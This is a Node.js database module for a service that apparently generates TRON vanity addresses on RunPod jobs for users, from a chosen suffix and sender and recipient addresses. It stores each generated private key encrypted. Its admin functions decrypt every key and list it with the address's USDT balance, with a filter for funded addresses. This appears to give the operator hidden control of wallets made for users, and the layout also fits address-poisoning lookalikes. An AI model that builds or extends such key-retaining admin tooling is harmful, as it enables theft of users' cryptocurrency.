const { query } = require('./db');
const { encryptText, decryptText } = require('./cryptoBox');
const { isTerminalStatus } = require('./runpod');

function findValueDeep(value, names) {
  if (!value || typeof value !== 'object') return null;
  if (Array.isArray(value)) {
    for (const item of value) {
      const found = findValueDeep(item, names);
      if (found) return found;
    }
    return null;
  }
  for (const [key, entry] of Object.entries(value)) {
    if (names.includes(key) && entry !== null && entry !== undefined && String(entry)) return String(entry);
    const found = findValueDeep(entry, names);
    if (found) return found;
  }
  return null;
}

function extractRunpodResult(data) {
  return {
    address: findValueDeep(data, ['address', 'tronAddress', 'tron_address', 'public_address']),
    privateKey: findValueDeep(data, ['privateKey', 'private_key', 'privatekey']),
  };
}

async function createRunpodJob({ id, userId, firstName, username, fromAddress, suffix, toAddress, status, rawResponse }) {
  await query(
    `INSERT INTO runpod_jobs (id, user_id, first_name, username, from_address, suffix, to_address, status, raw_response)
     VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
     ON CONFLICT (id) DO UPDATE SET
       user_id = EXCLUDED.user_id,
       first_name = EXCLUDED.first_name,
       username = EXCLUDED.username,
       from_address = EXCLUDED.from_address,
       suffix = EXCLUDED.suffix,
       to_address = EXCLUDED.to_address,
       status = EXCLUDED.status,
       raw_response = EXCLUDED.raw_response,
       updated_at = NOW()`,
    [id, userId, firstName || null, username || null, fromAddress, suffix, toAddress, status, rawResponse || null],
  );
}

async function getRunpodJob(jobId) {
  const result = await query('SELECT * FROM runpod_jobs WHERE id = $1', [jobId]);
  return result.rows[0] || null;
}

async function getActiveRunpodJob(userId, ttlMs) {
  const result = await query(
    `SELECT * FROM runpod_jobs
     WHERE user_id = $1
       AND status NOT IN ('COMPLETED', 'FAILED', 'CANCELLED', 'TIMED_OUT')
       AND created_at > NOW() - ($2::text || ' milliseconds')::interval
     ORDER BY created_at DESC
     LIMIT 1`,
    [userId, ttlMs],
  );
  return result.rows[0] || null;
}

async function updateRunpodJobStatus(jobId, data) {
  const status = data.status || 'UNKNOWN';
  const error = data.error ? String(data.error) : null;
  const result = extractRunpodResult(data);
  const encryptedPrivateKey = result.privateKey ? encryptText(result.privateKey) : null;
  const finishedAt = isTerminalStatus(status) ? new Date() : null;
  await query(
    `UPDATE runpod_jobs SET
       status = $2,
       error = $3,
       result_address = COALESCE($4, result_address),
       private_key_encrypted = COALESCE($5, private_key_encrypted),
       private_key_nonce = COALESCE($6, private_key_nonce),
       private_key_tag = COALESCE($7, private_key_tag),
       raw_response = $8,
       finished_at = COALESCE($9, finished_at),
       updated_at = NOW()
     WHERE id = $1`,
    [jobId, status, error, result.address, encryptedPrivateKey?.encrypted || null,
      encryptedPrivateKey?.nonce || null, encryptedPrivateKey?.tag || null, data, finishedAt],
  );
  await query(
    `INSERT INTO runpod_status_events (job_id, status, error, raw_response)
     VALUES ($1, $2, $3, $4)`,
    [jobId, status, error, data],
  );
  return { status, error, address: result.address };
}

async function updateRunpodJobUsdtBalance(jobId, usdtBalance, checkedAt = new Date()) {
  if (!jobId) return;
  await query(
    `UPDATE runpod_jobs
     SET usdt_balance = $2, usdt_balance_checked_at = $3, updated_at = NOW()
     WHERE id = $1
       AND (usdt_balance_checked_at IS NULL OR usdt_balance_checked_at <= $3)`,
    [jobId, usdtBalance, checkedAt],
  );
}

async function listRunpodResultAddresses() {
  const result = await query(
    `SELECT DISTINCT result_address
     FROM runpod_jobs
     WHERE result_address IS NOT NULL AND result_address <> ''
     ORDER BY result_address`,
  );
  return result.rows.map((row) => row.result_address);
}

async function updateRunpodAddressUsdtBalance(address, usdtBalance, checkedAt) {
  await query(
    `UPDATE runpod_jobs
     SET usdt_balance = $2, usdt_balance_checked_at = $3, updated_at = NOW()
     WHERE result_address = $1
       AND (usdt_balance_checked_at IS NULL OR usdt_balance_checked_at <= $3)`,
    [address, usdtBalance, checkedAt],
  );
}

async function getAdminStats() {
  const result = await query(
    `SELECT
       COUNT(*) AS total_count,
       COUNT(*) FILTER (WHERE e.status = 'success') AS success_count,
       COUNT(*) FILTER (WHERE j.status NOT IN ('COMPLETED', 'FAILED', 'CANCELLED', 'TIMED_OUT')) AS pending_count,
       COALESCE((SELECT SUM(address_balance) FROM (
         SELECT MAX(usdt_balance) AS address_balance
         FROM runpod_jobs
         WHERE result_address IS NOT NULL
         GROUP BY result_address
       ) balances), 0) AS total_usdt
     FROM runpod_jobs j
     LEFT JOIN LATERAL (
       SELECT status FROM energy_requests er
       WHERE er.runpod_job_id = j.id
       ORDER BY er.created_at DESC
       LIMIT 1
     ) e ON TRUE`,
  );
  const row = result.rows[0];
  return {
    totalCount: Number(row.total_count || 0),
    successCount: Number(row.success_count || 0),
    pendingCount: Number(row.pending_count || 0),
    totalUsdt: Number(row.total_usdt || 0),
  };
}

async function listAdminRecords({ limit = 100, offset = 0, withUsdt = false } = {}) {
  const result = await query(
    `SELECT
       j.id,
       j.user_id,
       COALESCE(NULLIF(j.first_name, ''), NULLIF(e.first_name, '')) AS first_name,
       COALESCE(NULLIF(j.username, ''), NULLIF(e.username, '')) AS username,
       j.suffix,
       j.to_address,
       j.status AS runpod_status,
       j.error AS runpod_error,
       j.result_address,
       j.private_key_encrypted,
       j.private_key_nonce,
       j.private_key_tag,
       j.usdt_balance AS runpod_usdt_balance,
       j.usdt_balance_checked_at,
       j.created_at AS runpod_created_at,
       j.updated_at AS runpod_updated_at,
       j.finished_at AS runpod_finished_at,
       COALESCE(j.from_address, e.from_address) AS from_address,
       e.energy_count,
       e.has_usdt,
       e.usdt_balance AS request_usdt_balance,
       e.status AS energy_status,
       e.error AS energy_error,
       e.created_at AS energy_created_at
     FROM runpod_jobs j
     LEFT JOIN LATERAL (
       SELECT * FROM energy_requests er
       WHERE er.runpod_job_id = j.id
       ORDER BY er.created_at DESC
       LIMIT 1
     ) e ON TRUE
     WHERE ($3::boolean = FALSE OR COALESCE(j.usdt_balance, 0) > 0)
     ORDER BY j.created_at DESC
     LIMIT $1 OFFSET $2`,
    [limit, offset, withUsdt],
  );
  return result.rows.map((row) => ({
    id: row.id,
    userId: row.user_id,
    firstName: row.first_name,
    username: row.username,
    suffix: row.suffix,
    toAddress: row.to_address,
    fromAddress: row.from_address,
    runpodStatus: row.runpod_status,
    runpodError: row.runpod_error,
    resultAddress: row.result_address,
    privateKey: decryptText({ encrypted: row.private_key_encrypted, nonce: row.private_key_nonce, tag: row.private_key_tag }),
    runpodAddressUsdt: row.runpod_usdt_balance ?? 0,
    usdtBalanceCheckedAt: row.usdt_balance_checked_at,
    energyCount: row.energy_count,
    hasUsdt: row.has_usdt,
    energyStatus: row.energy_status,
    energyError: row.energy_error,
    runpodCreatedAt: row.runpod_created_at,
    runpodUpdatedAt: row.runpod_updated_at,
    runpodFinishedAt: row.runpod_finished_at,
    energyCreatedAt: row.energy_created_at,
  }));
}

module.exports = {
  createRunpodJob,
  getRunpodJob,
  getActiveRunpodJob,
  updateRunpodJobStatus,
  updateRunpodJobUsdtBalance,
  listRunpodResultAddresses,
  updateRunpodAddressUsdtBalance,
  listAdminRecords,
  getAdminStats,
};
